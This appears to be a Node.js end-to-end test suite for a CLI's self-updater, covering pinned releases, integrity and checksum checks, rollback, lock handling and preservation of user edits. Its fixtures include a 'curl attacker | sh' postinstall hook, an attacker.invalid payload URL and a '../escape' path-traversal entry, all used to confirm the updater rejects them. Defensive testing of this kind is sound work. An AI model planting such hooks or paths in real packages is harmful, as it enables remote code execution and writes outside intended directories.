import test from 'node:test';
import assert from 'node:assert/strict';
import { existsSync, lstatSync, mkdirSync, readFileSync, readdirSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { assertOfficialRequests, journey, mainChannel, releaseFixture, sha256 } from './update-fixtures/fixtures.mjs';

// Every product action below goes through the public CLI in a fresh Node process.
// Filesystem writes construct fixtures or simulate user edits/corruption only.
// No production modules are imported or invoked by the journey harness.

test('updates.inspect: inspect local state, check a pinned release, preserve all local files', t => {
  const f = journey(t, releaseFixture('9.9.9'));
  const state = f.status();
  assert.equal(state.auto, 'off'); assert.equal(state.managed, false);
  assert.equal(state.repository, 'pcopu/tracerCLI'); assert.equal(state.home, f.managedHome); assert.equal(f.requests().length, 0);
  assert.equal(existsSync(f.managedHome), false);
  const result = f.output(['update', '--check', '--json']);
  assert.equal(result.status, 'available'); assert.equal(result.version, '9.9.9');
  assert.equal(result.commit, f.sourceRelease.commit); assert.equal(result.channel, 'release');
  assert.match(result.verification, /not an independent publisher signature/);
  assert.equal(existsSync(f.managedHome), false);
  assert.equal(f.output(['update', '--check', '--version', '9.9.9', '--json']).commit, result.commit);
  assertOfficialRequests(f);
});

test('updates.bootstrap: install reviewed commit, then exercise official-main and empty-repository paths', t => {
  const f = journey(t, mainChannel(releaseFixture()));
  assert.equal(f.install(['--commit', f.sourceRelease.commit]).status, 'updated');
  assert.equal(f.requests().some(r => r.url.includes('/releases/')), false);
  assert.equal(f.ok(['--version'], { managed: true }).stdout, `${f.sourceRelease.version}\n`);
  const main = journey(t, mainChannel(releaseFixture()));
  const check = main.output(['update', '--check', '--json']);
  assert.equal(check.channel, 'main'); assert.equal(check.commit, main.sourceRelease.commit);
  assert.equal(main.install().status, 'updated');
  const emptyRelease = mainChannel(releaseFixture()); delete emptyRelease.routes['/git/ref/heads/main'];
  const empty = journey(t, emptyRelease);
  assert.equal(empty.output(['update', '--check', '--json']).status, 'unavailable');
  assert.equal(empty.output(['update', '--check', '--version', '9.0.0', '--json']).status, 'unavailable');
});

test('updates.pins: resolve annotated tags, refuse changed identities and ambiguous selectors', t => {
  const source = releaseFixture(), tag = 'a'.repeat(40);
  source.routes[`/git/ref/tags/v${source.version}`] = { object: { type: 'tag', sha: tag } };
  source.routes[`/git/tags/${tag}`] = { sha: tag, object: { type: 'commit', sha: source.commit } };
  const f = journey(t, source);
  assert.equal(f.output(['update', '--check', '--json']).commit, source.commit);
  source.routes[`/git/tags/${tag}`].sha = 'b'.repeat(40); f.use(source);
  f.bad(['update', '--check'], /tag checksum/);
  const before = f.requests().length;
  for (const commit of ['main', 'abc123', '../x', 'A'.repeat(40)]) f.bad(['update', '--check', '--commit', commit], /full, lowercase/);
  for (const version of ['latest', '^1.0.0', '1.0.0-beta.1', '01.0.0']) f.bad(['update', '--check', '--version', version], /exact stable/);
  f.bad(['update', '--check', '--version', source.version, '--commit', source.commit], /either an exact version or an exact commit/);
  assert.equal(f.requests().length, before);
});

test('updates.identity: reject foreign packages, dependencies and lifecycle hooks before activation', t => {
  for (const pkg of [
    { name: 'other' }, { repository: 'https://github.com/other/tracerCLI' }, { version: '99.0.0' },
    { dependencies: { malicious: '*' } }, { scripts: { postinstall: 'curl attacker | sh' } },
  ]) {
    const f = journey(t, releaseFixture(undefined, { package: pkg }));
    f.bad(['update', '--install-managed'], /identity|dependency-free|lifecycle/);
    assert.equal(existsSync(join(f.managedHome, 'active.json')), false);
  }
});

test('updates.install: preserve unmanaged source, verify managed files, run downloaded code only on next invocation', t => {
  const source = releaseFixture();
  source.files['bin/tracer.mjs'] = `import {writeFileSync as markRun} from 'node:fs'; markRun(process.env.TRACER_E2E_EXECUTION_MARKER, 'ran');\n${source.files['bin/tracer.mjs'].replace(/^#!.*\n/, '')}`;
  const f = journey(t, releaseFixture(undefined, { files: { 'bin/tracer.mjs': source.files['bin/tracer.mjs'] } }));
  const marker = join(f.dir, 'downloaded-code-ran');
  const original = f.put('custom.txt', 'unrelated work');
  assert.equal(f.output(['update', '--json']).status, 'unmanaged');
  assert.equal(f.requests().length, 0); assert.equal(existsSync(f.managedHome), false);
  const result = f.output(['update', '--install-managed', '--json'], { env: { TRACER_E2E_EXECUTION_MARKER: marker } });
  assert.equal(result.status, 'updated'); assert.equal(existsSync(marker), false);
  assert.equal(readFileSync(original, 'utf8'), 'unrelated work');
  const current = f.active().current, root = join(f.managedHome, 'releases', current);
  const manifest = JSON.parse(readFileSync(join(root, '.tracer-release.json'), 'utf8'));
  assert.equal(manifest.commit, f.sourceRelease.commit);
  for (const file of manifest.files) assert.equal(sha256(readFileSync(join(root, file.path))), file.sha256);
  assert.equal(lstatSync(result.launcher).mode & 0o777, 0o755);
  assert.equal(f.ok(['--version'], { managed: true, env: { TRACER_E2E_EXECUTION_MARKER: marker } }).stdout, `${f.sourceRelease.version}\n`);
  assert.equal(readFileSync(marker, 'utf8'), 'ran');
  assert.equal(f.status({ env: { TRACER_E2E_EXECUTION_MARKER: marker } }).runningManaged, false);
  assert.equal(f.status({ managed: true, env: { TRACER_E2E_EXECUTION_MARKER: marker } }).runningManaged, true);
});

test('updates.integrity: reject corrupt blobs, malformed trees, truncation, symlinks and unsafe filenames', t => {
  const corrupt = releaseFixture(), entry = corrupt.tree.find(item => item.path === 'src/tracer.mjs');
  corrupt.routes[`/git/blobs/${entry.sha}`].content = Buffer.from('malicious new content').toString('base64');
  const cases = [[corrupt, /checksum mismatch/]];
  const mismatch = releaseFixture(); mismatch.tree.find(item => item.path === 'src/tracer.mjs').sha = 'f'.repeat(40);
  cases.push([mismatch, /tree checksum/]);
  const truncated = releaseFixture(); truncated.routes[`/git/trees/${truncated.rootSHA}?recursive=1`].truncated = true;
  cases.push([truncated, /Incomplete/]);
  cases.push([releaseFixture(undefined, { modes: { 'src/tracer.mjs': '120000' } }), /unsafe.*symlinked/]);
  const unsafe = releaseFixture(); unsafe.tree.push({ path: '../escape', mode: '100644', type: 'blob', sha: 'e'.repeat(40), size: 0 });
  cases.push([unsafe, /Unsafe or malformed/]);
  cases.push([releaseFixture(undefined, { files: { 'src/Tracer.mjs': 'export const x = 1;' } }), /duplicate/]);
  for (const [source, error] of cases) {
    const f = journey(t, source); f.bad(['update', '--install-managed'], error);
    assert.equal(existsSync(join(f.managedHome, 'active.json')), false);
    assert.equal(existsSync(join(f.managedHome, 'releases')), false);
    assert.equal(existsSync(join(f.dir, 'escape')), false);
  }
});

test('updates.rollback: update real managed CLI, run it, then roll back without network or skill downgrade', t => {
  const f = journey(t); f.init(['--agent', 'codex', '--install-skill']);
  f.install(); const original = f.active().current;
  f.use(releaseFixture('9.8.0'));
  const next = f.output(['update', '--json'], { managed: true });
  assert.equal(next.status, 'updated'); assert.equal(next.skills[0].status, 'updated');
  assert.equal(f.active().previous, original); assert.equal(f.ok(['--version'], { managed: true }).stdout, '9.8.0\n');
  const count = f.requests().length;
  assert.equal(f.output(['update', '--rollback', '--json'], { managed: true }).status, 'rolled-back');
  assert.equal(f.active().current, original); assert.equal(f.requests().length, count);
  assert.equal(f.ok(['--version'], { managed: true }).stdout, `${f.sourceRelease.version}\n`);
  assert.match(readFileSync(f.skill('codex'), 'utf8'), /9\.8\.0/);
  assert.equal(existsSync(join(f.managedHome, 'releases', `${next.version}-${next.commit}`)), true);
});

test('updates.atomic: failed next download leaves active CLI, skill and prior source bytes unchanged', t => {
  const f = journey(t); f.init(['--agent', 'codex', '--install-skill']); f.install();
  const pointer = readFileSync(join(f.managedHome, 'active.json'), 'utf8'), skill = readFileSync(f.skill('codex'));
  const next = releaseFixture('9.8.0'), entry = next.tree.find(item => item.path === 'skills/tracer/SKILL.md');
  delete next.routes[`/git/blobs/${entry.sha}`]; f.use(next);
  f.bad(['update'], /source blob/, { managed: true });
  assert.equal(readFileSync(join(f.managedHome, 'active.json'), 'utf8'), pointer);
  assert.deepEqual(readFileSync(f.skill('codex')), skill);
  assert.equal(f.ok(['--version'], { managed: true }).stdout, `${f.sourceRelease.version}\n`);
  assert.equal(readdirSync(join(f.managedHome, 'releases')).filter(name => name.startsWith('.stage')).length, 0);
});

test('updates.local-edits: refuse replacing edited managed runtime or launcher while preserving every edit', t => {
  const f = journey(t); f.install(); const original = f.active().current;
  const path = join(f.managedHome, 'releases', original, 'src/tracer.mjs'); writeFileSync(path, 'custom code');
  f.use(releaseFixture('9.8.0')); f.bad(['update'], /Managed file changed/);
  assert.equal(readFileSync(path, 'utf8'), 'custom code'); assert.equal(f.active().current, original);
  const clean = journey(t); clean.install(); const launcher = join(clean.managedHome, 'bin/tracer');
  writeFileSync(launcher, 'custom launcher'); clean.use(releaseFixture('9.8.0'));
  clean.bad(['update'], /launcher was edited/); assert.equal(readFileSync(launcher, 'utf8'), 'custom launcher');
});

test('updates.downgrade: old source CLI cannot downgrade a newer managed target', t => {
  const f = journey(t, releaseFixture('9.8.0')); f.install();
  assert.equal(f.ok(['--version']).stdout.trim(), JSON.parse(readFileSync(new URL('../../package.json', import.meta.url), 'utf8')).version);
  f.use(releaseFixture('0.2.0')); f.bad(['update'], /Downgrades/);
  assert.ok(f.active().current.startsWith('9.8.0-'));
  assert.equal(f.ok(['--version'], { managed: true }).stdout, '9.8.0\n');
});

test('updates.retag: preserve same-version release, then accept an explicitly reviewed full commit', t => {
  const a = releaseFixture(), f = journey(t, a); f.install();
  const b = releaseFixture(a.version, { files: { 'docs/updates.md': '# Reviewed same-version change\n' } }); f.use(b);
  assert.equal(f.output(['update', '--json']).status, 'current'); assert.equal(f.active().current, `${a.version}-${a.commit}`);
  assert.equal(f.output(['update', '--commit', b.commit, '--json']).status, 'updated');
  assert.equal(f.active().current, `${b.version}-${b.commit}`);
});

test('updates.modes: persist opt-in, keep read-only commands deterministic, honor CI and process opt-out', t => {
  const f = journey(t); f.init();
  f.ok(['app', '--', 'default-off'], { env: { TRACER_NO_UPDATE: '0' } }); assert.equal(f.requests().length, 0);
  for (const mode of ['apply', 'check', 'off', 'apply']) assert.equal(f.output(['update', '--auto', mode, '--json']).auto, mode);
  f.bad(['update', '--auto', 'yes'], /off, check or apply/);
  for (const args of [['report', '--json'], ['check', '--json'], ['config', '--json'], ['update', '--status'], ['--version'], ['--help']]) {
    f.ok(args, { env: { TRACER_NO_UPDATE: '0' } });
  }
  for (const env of [{ CI: '1', TRACER_NO_UPDATE: '0' }, { TRACER_NO_UPDATE: '1' }]) f.ok(['app', '--', 'skip-auto'], { env });
  assert.equal(f.requests().length, 0);
  assert.equal(existsSync(join(f.managedHome, 'active.json')), false);
});

test('updates.throttle: check once daily, cache results, tolerate offline failure without changing app success', t => {
  const f = journey(t); f.init(); f.ok(['update', '--auto', 'check']);
  const env = { TRACER_NO_UPDATE: '0' };
  const first = f.output(['app', '--', 'read'], { env }); assert.deepEqual(first, { args: ['read'], cwd: f.root });
  const count = f.requests().length; assert.ok(count > 0);
  assert.equal(f.status().lastResult.commit, f.sourceRelease.commit);
  f.ok(['app', '--', 'again'], { env }); assert.equal(f.requests().length, count);
  f.transport({ now: 100000000 + 86400000 }); f.ok(['app', '--', 'tomorrow'], { env }); assert.ok(f.requests().length > count);
  assert.equal(existsSync(join(f.managedHome, 'active.json')), false);
  f.transport({ now: 100000000 + 2 * 86400000, networkError: 'synthetic offline' });
  const failed = f.ok(['app', '--', 'still-works'], { env });
  assert.deepEqual(JSON.parse(failed.stdout), { args: ['still-works'], cwd: f.root });
  assert.equal(f.status().lastResult.status, 'error'); assert.match(f.status().lastResult.message, /synthetic offline/);
  const after = f.requests().length; f.ok(['app', '--', 'throttled-error'], { env }); assert.equal(f.requests().length, after);
});

test('updates.unmanaged-auto: requested auto apply checks only and never migrates the source install', t => {
  const f = journey(t, releaseFixture('9.9.9')); f.init(); const source = readFileSync(join(f.root, 'src/example.mjs'));
  f.ok(['update', '--auto', 'apply']);
  f.ok(['app', '--', 'read'], { env: { TRACER_NO_UPDATE: '0' } });
  assert.equal(f.status().lastResult.status, 'available');
  assert.equal(existsSync(join(f.managedHome, 'active.json')), false);
  assert.deepEqual(readFileSync(join(f.root, 'src/example.mjs')), source);
});

test('updates.managed-auto: real managed launcher advances same-version main only after descendant verification', t => {
  const a = mainChannel(releaseFixture()), f = journey(t, a);
  f.init(); f.install(); f.ok(['update', '--auto', 'apply']);
  const nextExecution = join(f.dir, 'auto-update-code-ran');
  const nextBin = `import {writeFileSync as markAutoRun} from 'node:fs'; markAutoRun(${JSON.stringify(nextExecution)}, 'ran');\n${a.files['bin/tracer.mjs'].replace(/^#!.*\n/, '')}`;
  const b = mainChannel(releaseFixture(a.version, { files: { 'bin/tracer.mjs': nextBin, 'docs/updates.md': '# New main descendant\n' } }));
  const compare = `/compare/${a.commit}...${b.commit}`;
  b.routes[compare] = { status: 'diverged', base_commit: { sha: a.commit }, merge_base_commit: { sha: 'b'.repeat(40) } };
  f.use(b); const env = { TRACER_NO_UPDATE: '0' };
  assert.deepEqual(f.output(['app', '--', 'read'], { managed: true, env }), { args: ['read'], cwd: f.root });
  assert.equal(f.status().lastResult.status, 'error'); assert.equal(f.active().current, `${a.version}-${a.commit}`);
  b.routes[compare] = { status: 'ahead', base_commit: { sha: a.commit }, merge_base_commit: { sha: a.commit } };
  f.use(b, { now: 100000000 + 86400000 });
  assert.deepEqual(f.output(['app', '--', 'read-again'], { managed: true, env }), { args: ['read-again'], cwd: f.root });
  assert.equal(f.status().lastResult.status, 'updated'); assert.equal(f.active().current, `${b.version}-${b.commit}`);
  assert.equal(existsSync(nextExecution), false, 'Auto application must not execute fetched CLI code during the triggering app command.');
  assert.equal(f.status({ managed: true }).runningManaged, true);
  assert.equal(readFileSync(nextExecution, 'utf8'), 'ran', 'The next explicit managed invocation uses the new CLI.');
});

test('updates.skills: real init registers pristine skills, preserves edits/custom skills and never changes instruction files', t => {
  const f = journey(t); f.init(['--agent', 'codex', '--install-skill']); f.ok(['init', '--agent', 'claude', '--install-skill']);
  assert.equal(f.settings().skills.length, 2);
  writeFileSync(f.skill('claude'), '# My custom skill\n');
  const customHome = join(f.home, 'custom-codex'), unknown = join(customHome, 'skills/tracer/SKILL.md');
  mkdirSync(dirname(unknown), { recursive: true }); writeFileSync(unknown, '# Existing unregistered skill\n');
  f.ok(['init', '--agent', 'codex', '--install-skill'], { env: { CODEX_HOME: customHome } });
  assert.equal(f.settings().skills.length, 2);
  const agents = f.put('AGENTS.md', 'user instructions'), claude = f.put('CLAUDE.md', 'other instructions');
  const result = f.install();
  assert.equal(result.skills.find(s => s.path === f.skill('codex')).status, 'updated');
  assert.equal(result.skills.find(s => s.path === f.skill('claude')).status, 'modified');
  assert.equal(readFileSync(f.skill('codex'), 'utf8'), f.sourceRelease.files['skills/tracer/SKILL.md']);
  assert.equal(readFileSync(f.skill('claude'), 'utf8'), '# My custom skill\n');
  assert.equal(readFileSync(unknown, 'utf8'), '# Existing unregistered skill\n');
  assert.equal(readFileSync(agents, 'utf8'), 'user instructions'); assert.equal(readFileSync(claude, 'utf8'), 'other instructions');
});

test('updates.skill-boundaries: missing/symlinked skills stay untouched, reinstall cannot bless edits, forged instruction targets fail', t => {
  const f = journey(t); f.init(['--agent', 'codex', '--install-skill']); f.ok(['init', '--agent', 'claude', '--install-skill']);
  const original = f.settings().skills.find(s => s.path === f.skill('codex')).sha256;
  writeFileSync(f.skill('codex'), 'custom'); f.ok(['init', '--agent', 'codex', '--install-skill']);
  assert.equal(f.settings().skills.find(s => s.path === f.skill('codex')).sha256, original);
  rmSync(f.skill('codex')); rmSync(f.skill('claude'));
  const target = f.put('important.txt', 'untouched'); symlinkSync(target, f.skill('claude'));
  const result = f.install();
  assert.equal(result.skills.find(s => s.path === f.skill('codex')).status, 'missing');
  assert.equal(result.skills.find(s => s.path === f.skill('claude')).status, 'preserved');
  assert.equal(readFileSync(target, 'utf8'), 'untouched'); assert.equal(existsSync(f.skill('codex')), false);
  const settings = f.settings(), instruction = f.put('AGENTS.md', 'preserve instruction'); settings.skills[0].path = instruction;
  writeFileSync(join(f.managedHome, 'settings.json'), JSON.stringify(settings));
  f.bad(['update', '--status'], /Invalid registered skill/);
  assert.equal(readFileSync(instruction, 'utf8'), 'preserve instruction');
});

test('updates.locks: refuse symlinked state roots and concurrent writers without touching their targets', t => {
  const f = journey(t), elsewhere = join(f.dir, 'elsewhere'); mkdirSync(elsewhere);
  mkdirSync(dirname(f.managedHome), { recursive: true }); symlinkSync(elsewhere, f.managedHome);
  f.bad(['update', '--auto', 'apply'], /unsymlinked/); assert.deepEqual(readdirSync(elsewhere), []);
  rmSync(f.managedHome); mkdirSync(f.managedHome); mkdirSync(join(f.managedHome, '.update-lock'));
  f.bad(['update', '--install-managed'], /Another update/);
  assert.equal(existsSync(join(f.managedHome, '.update-lock')), true);
  assert.equal(existsSync(join(f.managedHome, 'active.json')), false);
});

test('updates.transport: install over loopback HTTP fixture, refuse HTTP failures and foreign-origin responses', t => {
  const http = journey(t); http.transport({ transport: 'http' });
  assert.equal(http.install().status, 'updated'); assertOfficialRequests(http);
  assert.ok(http.requests().some(request => request.url.includes('/git/blobs/')));
  const fail = journey(t); fail.transport({ httpStatus: 403 });
  fail.bad(['update', '--install-managed'], /403/); assert.equal(existsSync(join(fail.managedHome, 'active.json')), false);
  fail.transport({ httpStatus: 200, foreignURL: 'https://attacker.invalid/payload' });
  fail.bad(['update', '--check'], /changed origin/);
  assert.equal(existsSync(join(fail.managedHome, 'active.json')), false);
});

test('updates.published-skill: same-version main descendant delivers checked-in guidance and preserves user edits', t => {
  const skillPath = 'skills/tracer/SKILL.md';
  const publishedSkill = readFileSync(new URL('../../skills/tracer/SKILL.md', import.meta.url), 'utf8');
  const original = mainChannel(releaseFixture()), f = journey(t, original);
  const agents = f.put('AGENTS.md', 'Keep project-specific Codex instructions.\r\n');
  const claude = f.put('CLAUDE.md', 'Keep project-specific Claude instructions.\n');
  f.init(['--agent', 'codex', '--install-skill', '--add-instruction']);
  f.ok(['init', '--agent', 'claude', '--install-skill', '--add-instruction']);
  const agentInstructions = readFileSync(agents), claudeInstructions = readFileSync(claude);
  const projectConfig = readFileSync(join(f.root, 'tracer.json'));
  assert.equal(f.install().status, 'updated');
  assert.equal(readFileSync(f.skill('codex'), 'utf8'), original.files[skillPath]);
  assert.notEqual(original.files[skillPath], publishedSkill);
  const customSkill = `${original.files[skillPath]}\nKeep my reviewed local workflow.\n`;
  writeFileSync(f.skill('claude'), customSkill);
  const priorClaudeHash = f.settings().skills.find(s => s.path === f.skill('claude')).sha256;
  const next = mainChannel(releaseFixture(original.version, { files: { [skillPath]: publishedSkill } }));
  const compare = `/compare/${original.commit}...${next.commit}`;
  next.routes[compare] = { status: 'ahead', base_commit: { sha: original.commit }, merge_base_commit: { sha: original.commit } };
  f.use(next);
  f.ok(['update', '--auto', 'apply']);
  const app = f.output(['app', '--', 'refresh-skill'], { managed: true, env: { TRACER_NO_UPDATE: '0' } });
  assert.deepEqual(app, { args: ['refresh-skill'], cwd: f.root });
  const result = f.status().lastResult;
  assert.equal(result.status, 'updated'); assert.equal(result.version, original.version); assert.equal(result.commit, next.commit);
  assert.equal(f.active().current, `${original.version}-${next.commit}`);
  assert.equal(f.active().previous, `${original.version}-${original.commit}`);
  assert.equal(readFileSync(f.skill('codex'), 'utf8'), publishedSkill);
  assert.equal(readFileSync(f.skill('claude'), 'utf8'), customSkill);
  assert.equal(readFileSync(join(f.managedHome, 'releases', f.active().current, skillPath), 'utf8'), publishedSkill);
  assert.equal(f.settings().skills.find(s => s.path === f.skill('codex')).sha256, sha256(publishedSkill));
  assert.equal(f.settings().skills.find(s => s.path === f.skill('claude')).sha256, priorClaudeHash);
  const skillBlob = next.tree.find(entry => entry.path === skillPath).sha;
  assert.ok(f.requests().some(request => request.url.endsWith(compare)));
  assert.ok(f.requests().some(request => request.url.endsWith(`/git/blobs/${skillBlob}`)));
  f.ok(['init', '--agent', 'codex', '--install-skill'], { managed: true });
  f.ok(['init', '--agent', 'claude', '--install-skill'], { managed: true });
  assert.equal(readFileSync(f.skill('codex'), 'utf8'), publishedSkill);
  assert.equal(readFileSync(f.skill('claude'), 'utf8'), customSkill);
  assert.deepEqual(readFileSync(agents), agentInstructions); assert.deepEqual(readFileSync(claude), claudeInstructions);
  assert.deepEqual(readFileSync(join(f.root, 'tracer.json')), projectConfig);
  assert.equal(f.status({ managed: true }).currentVersion, original.version);
  assertOfficialRequests(f);
});
